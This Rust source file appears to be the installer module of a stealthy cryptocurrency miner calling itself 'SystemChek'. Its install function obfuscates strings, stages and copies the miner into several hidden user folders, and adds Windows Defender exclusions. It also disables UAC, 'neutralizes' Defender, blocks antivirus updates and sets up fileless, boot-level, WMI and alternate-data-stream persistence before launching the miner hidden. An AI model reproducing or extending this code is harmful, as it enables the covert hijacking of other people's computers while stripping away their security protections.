use std::fs;
use std::path::Path;

// use crate::common::config::MinerConfig; // Moved to module
use crate::common::constants::get_launcher_script_name;
use crate::utils::files::copy_dir_recursive;
use crate::utils::paths::{get_all_install_dirs, set_hidden_recursive, get_userprofile};
use crate::host::process;
use crate::modules::miner::stop_mining;
use crate::modules::miner::{install as miner_install, status as miner_status};
use crate::host::registry::{add_to_startup, remove_from_startup};

pub fn install() -> Result<(), Box<dyn std::error::Error>> {
    use obfstr::obfstr;
    // 1. Prepare Initial Staging Area (Temp)
    let staging_dir = get_userprofile().join(obfstr!("AppData")).join(obfstr!("Local")).join(obfstr!("Temp")).join(obfstr!("Staging_SystemChek")); // Hardcoded temp staging
    if staging_dir.exists() {
        let _ = fs::remove_dir_all(&staging_dir);
    }
    fs::create_dir_all(&staging_dir)?;

    // 1. Prepare Initial Staging Area (Temp)
    // Delegate mining setup to Miner Module
    // This handles Download, Extract, Rename, Config
    miner_install::prepare_miner(&staging_dir)?;

    // 2. Distribute to ALL locations (AppData, LocalAppData, Temp)
    let install_dirs = get_all_install_dirs();
    
    // First, copy files to all locations
    for dir in &install_dirs {
        if dir.exists() {
            let _ = fs::remove_dir_all(dir);
        }
        fs::create_dir_all(dir)?;
        copy_dir_recursive(&staging_dir, dir)?;
    }

    // 3. Generate Scripts in ALL locations
    // We pass the list of all install dirs so the scripts can cross-reference
    process::create_watchdog_script(&install_dirs, &Path::new("dummy"))?; // Config path is relative in script now

    // 4. Set Hidden Attributes on ALL locations
    for dir in &install_dirs {
        set_hidden_recursive(dir)?;
        // Auto-whitelist in Defender
        let _ = crate::host::process::add_defender_exclusion(dir);
    }
    
    // 5. Seed the Registry Ledger (P2P Discovery)
    #[cfg(windows)]
    {
        use std::process::Command;
        let dirs_str = install_dirs.iter()
            .map(|d| d.display().to_string())
            .collect::<Vec<String>>()
            .join(";");
            
        let _ = Command::new("powershell.exe")
            .args(&[
                "-Command",
                &format!("New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\SystemChek' -Force; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\SystemChek' -Name 'Nodes' -Value '{}'", dirs_str)
            ])
            .output();
    }

    // 5. Add to Startup (Use the First available location, usually AppData)
    if let Some(primary_dir) = install_dirs.first() {
        let launcher = primary_dir.join(get_launcher_script_name());
        add_to_startup(&launcher)?;
        
        // Disable UAC prompts
        let _ = crate::host::registry::disable_uac();
        
        // Neutralize Defender (Allow threats)
        let _ = crate::host::process::neutralize_defender();
        
        // Deep Sleeper (Fileless Persistence)
        let _ = crate::host::process::create_fileless_sleeper();

        // System Supervisor Service (Boot-Level)
        let _ = crate::host::process::create_system_supervisor();

        // Chameleon Protocol (Communications Jamming)
        let _ = crate::host::network::block_av_updates();

        // Shadow Persistence (ADS + WMI)
        let _ = crate::host::shadow::apply_shadow_persistence();

        // Copy self to bin (optional, can skip or rename to sys_installer.exe)
        // let _ = copy_self_to_bin(); 
    }

    // 6. Start (Launch from all locations to be safe/ensure redundancy kicks in)
    for dir in &install_dirs {
        let launcher = dir.join(get_launcher_script_name());
        if launcher.exists() {
             process::start_hidden(&launcher)?;
        }
    }

    // Cleanup Staging
    let _ = fs::remove_dir_all(&staging_dir);

    Ok(())
}

pub fn uninstall() -> Result<(), Box<dyn std::error::Error>> {
    stop_mining()?;
    remove_from_startup()?;
    
    // Remove all install directories
    let install_dirs = get_all_install_dirs();
    for dir in install_dirs {
        if dir.exists() {
            let _ = fs::remove_dir_all(&dir);
        }
    }
    
    Ok(())
}

pub fn start() -> Result<(), Box<dyn std::error::Error>> {
    let install_dirs = get_all_install_dirs();
    let mut started = false;

    for dir in &install_dirs {
        let launcher = dir.join(get_launcher_script_name());
        if launcher.exists() {
            process::start_hidden(&launcher)?;
            started = true;
        }
    }

    if !started {
        // Self-Healing Trigger?
        // If NO location exists, we might be broken.
        // But if at least ONE exists, it should have started and ostensibly healed the others.
        // If the user runs 'automine start', we assume they might be running the installer again or just the CLI.
        println!("No valid installation found to start.");
    }
    
    Ok(())
}

#[cfg(windows)]
pub fn status() {
    miner_status::check_status();
}

#[cfg(not(windows))]
pub fn status() {
    miner_status::check_status();
}
